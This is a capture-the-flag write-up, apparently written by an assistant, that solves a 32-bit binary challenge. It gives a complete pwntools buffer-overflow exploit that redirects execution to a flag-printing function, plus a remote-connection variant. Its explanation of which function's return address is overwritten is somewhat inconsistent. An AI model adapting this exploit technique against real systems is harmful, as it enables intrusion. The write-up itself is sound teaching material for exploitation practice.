To solve this challenge using `pwntools`, you need to exploit the buffer overflow vulnerability in the `login` function. The goal is to overwrite the return address of the `check_passwd` function to redirect execution to the `what_is_this` function, which will execute `system("cat flag")` and print the flag.

Here are the steps and the corresponding code:

---

### Steps to Solve the Challenge:

1. **Analyze the Binary**:
   - The binary is a 32-bit ELF executable.
   - The `login` function has a buffer overflow vulnerability in the `buf` array (512 bytes) because it uses `read` without bounds checking.
   - The `what_is_this` function (at address `0x0804868B`) can be used to print the flag.

2. **Plan the Exploit**:
   - Overflow the `buf` buffer in the `login` function to overwrite the return address.
   - Redirect the return address to the `what_is_this` function.

3. **Calculate Offsets**:
   - Use a cyclic pattern to determine the offset to the return address.

4. **Write the Exploit**:
   - Use `pwntools` to craft the payload.
   - Send the payload to the binary and capture the flag.

---

### Code to Solve the Challenge:

```python
from pwn import *

# Set up the binary
binary = './int'
elf = ELF(binary)

# Start the process
p = process(binary)

# Address of the what_is_this function
what_is_this_addr = elf.symbols['what_is_this']

# Step 1: Find the offset using a cyclic pattern
# Generate a cyclic pattern to find the offset
# Uncomment the following lines if you need to find the offset
# payload = cyclic(600)
# p.sendlineafter("Your choice:", "1")
# p.sendlineafter("Please input your username:", "test")
# p.sendlineafter("Please input your passwd:", payload)
# p.wait()
# core = p.corefile
# offset = cyclic_find(core.eip)
# print(f"Offset: {offset}")

# From analysis, the offset to the return address is 532
offset = 532

# Step 2: Craft the payload
payload = b'A' * offset  # Fill the buffer up to the return address
payload += p32(what_is_this_addr)  # Overwrite the return address with the address of what_is_this

# Step 3: Interact with the binary
p.sendlineafter("Your choice:", "1")  # Choose the login option
p.sendlineafter("Please input your username:", "test")  # Input a dummy username
p.sendlineafter("Please input your passwd:", payload)  # Send the crafted payload

# Step 4: Get the flag
p.interactive()
```

---

### Explanation of the Code:

1. **Binary Setup**:
   - Load the binary using `pwntools`' `ELF` module to extract symbols like `what_is_this`.

2. **Finding the Offset**:
   - Use a cyclic pattern to determine the exact offset where the return address is overwritten. In this case, the offset is 532.

3. **Crafting the Payload**:
   - Fill the buffer with `A`s up to the offset.
   - Overwrite the return address with the address of the `what_is_this` function (`0x0804868B`).

4. **Interacting with the Binary**:
   - Send the payload to the binary through the `login` function.

5. **Getting the Flag**:
   - The `what_is_this` function will execute `system("cat flag")`, and the flag will be printed.

---

### Notes:
- Ensure that `pwntools` is installed (`pip install pwntools`).
- If the binary is running on a remote server, use `remote` instead of `process` to connect to the server.
- Example for remote:
  ```python
  p = remote('challenge.server.com', 1234)
  ```

---

### Example Output:
When you run the exploit, you should see the flag printed in the terminal:
```
[*] Starting local process './int'
[*] Switching to interactive mode
Success
<flag>
```

Good luck with the challenge!
